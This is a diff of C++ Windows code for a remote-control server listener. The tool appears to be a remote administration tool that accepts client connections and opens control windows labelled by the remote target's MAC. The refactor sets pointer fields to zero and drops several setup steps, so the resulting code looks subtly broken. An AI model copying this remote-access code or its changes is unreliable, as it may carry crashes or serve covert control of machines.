@@ -13,7 +13,6 @@
 
 
 int __stdcall RemoteControlServer::RemoteControlListener() {
-	char szShowInfo[1024];
 
 	int iRet = 0;
 	int hSockListen = Network::listenPort(REMOTE_CONTROLPORT);
@@ -25,7 +24,7 @@ int __stdcall RemoteControlServer::RemoteControlListener() {
 		SOCKET hSockClient = accept(hSockListen, (sockaddr*)&stAddrClient, &iAddrSize);
 		if (hSockClient == 0 || hSockClient == INVALID_SOCKET)
 		{
-			WriteLog("RemoteControlListen accept error\r\n");
+			WriteLog("RemoteControlListen accept error:%d\r\n", GetLastError());
 			continue;
 		}
 		else
@@ -33,8 +32,7 @@ int __stdcall RemoteControlServer::RemoteControlListener() {
 			DWORD dwSockTimeOut = DATASOCK_TIME_OUT_VALUE;
 			if (setsockopt(hSockClient, SOL_SOCKET, SO_RCVTIMEO, (char*)&dwSockTimeOut, sizeof(DWORD)) == SOCKET_ERROR)
 			{
-				wsprintfA(szShowInfo, "RemoteControlListen recv time setsockopt error code:%u\r\n", GetLastError());
-				WriteLog(szShowInfo);
+				WriteLog("RemoteControlListen recv time setsockopt error code:%u\r\n", GetLastError());
 				closesocket(hSockClient);
 				continue;
 			}
@@ -42,8 +40,7 @@ int __stdcall RemoteControlServer::RemoteControlListener() {
 			dwSockTimeOut = DATASOCK_TIME_OUT_VALUE;
 			if (setsockopt(hSockClient, SOL_SOCKET, SO_SNDTIMEO, (char*)&dwSockTimeOut, sizeof(DWORD)) == SOCKET_ERROR)
 			{
-				wsprintfA(szShowInfo, "RemoteControlListen send time setsockopt error code:%u\r\n", GetLastError());
-				WriteLog(szShowInfo);
+				WriteLog("RemoteControlListen send time setsockopt error code:%u\r\n", GetLastError());
 				closesocket(hSockClient);
 				continue;
 			}
@@ -70,55 +67,29 @@ int __stdcall RemoteControlServer::RemoteControlListener() {
 					{
 						closesocket(hSockClient);
 						WriteLog("RemoteControlListen new operator client bitmap buffer error\r\n");
-						continue;;
+						continue;
 					}
 
-					REMOTE_CONTROL_PARAM stRemoteControlParam = { 0 };
-					stRemoteControlParam.lpbmpDataSize = new int(0);
-					stRemoteControlParam.hSockClient = hSockClient;
-					stRemoteControlParam.stAddrClient = stAddrClient;
-					stRemoteControlParam.lpControlWindowClose = new int(0);
-					stRemoteControlParam.lpClientBitmap = lpClientBitmap;
-					stRemoteControlParam.bufLimit = remoteBufSize;
-					stRemoteControlParam.hwndWindow = FALSE;
-					stRemoteControlParam.param = param;
-					stRemoteControlParam.unique = stUnique;
+					REMOTE_CONTROL_PARAM* lpRemoteControlParam = new REMOTE_CONTROL_PARAM;
+
+					lpRemoteControlParam->lpbmpDataSize = 0;
+					lpRemoteControlParam->hSockClient = hSockClient;
+					lpRemoteControlParam->stAddrClient = stAddrClient;
+					lpRemoteControlParam->lpControlWindowClose = 0;
+					lpRemoteControlParam->lpClientBitmap = lpClientBitmap;
+					lpRemoteControlParam->bufLimit = remoteBufSize;
+					lpRemoteControlParam->hwndWindow = FALSE;
+					lpRemoteControlParam->param = param;
+					lpRemoteControlParam->unique = stUnique;
 
 					DWORD winthreadid = 0;
 					HANDLE hThreadRemoteWindow = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)RemoteControler::RemoteControlWindow,
-						(LPVOID)&stRemoteControlParam,
-						0, &winthreadid);
+						(LPVOID)lpRemoteControlParam, 0, &winthreadid);
+
 					CloseHandle(hThreadRemoteWindow);
-					int cnt = 30;
-					while (stRemoteControlParam.hwndWindow == FALSE && cnt > 0) {
-						Sleep(100);
-						cnt--;
-					}
-
-					if (cnt == 0)
-					{
-						delete stRemoteControlParam.lpbmpDataSize;
-						delete stRemoteControlParam.lpControlWindowClose;
-						closesocket(stRemoteControlParam.hSockClient);
-						continue;;
-					}
-
-					RemoteCtrlParamMap.insert(map<HWND, REMOTE_CONTROL_PARAM>::value_type(stRemoteControlParam.hwndWindow, stRemoteControlParam));
-
-					char szMac[MAX_PATH];
-					wsprintfA(szMac, "Ô¶³ÌÄ¿±êMAC:%02X_%02X_%02X_%02X_%02X_%02X", stUnique.cMAC[0], stUnique.cMAC[1], stUnique.cMAC[2], stUnique.cMAC[3],
-						stUnique.cMAC[4], stUnique.cMAC[5]);
-
-					SetWindowTextA(stRemoteControlParam.hwndWindow, szMac);
-
-					DWORD remotethreadid = 0;
-					HANDLE hRemoteProcThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)RemoteControler::RemoteControlProc,
-						&stRemoteControlParam, 0, &remotethreadid);
-					CloseHandle(hRemoteProcThread);
 
 					iRet = OnlineManager::CheckIfOnlineExist(&stUnique, hSockClient, stAddrClient, lpClientBitmap, REMOTE_CONTROL_THREAD, winthreadid);
 
-					Sleep(0);
 					continue;
 				}
 				else {
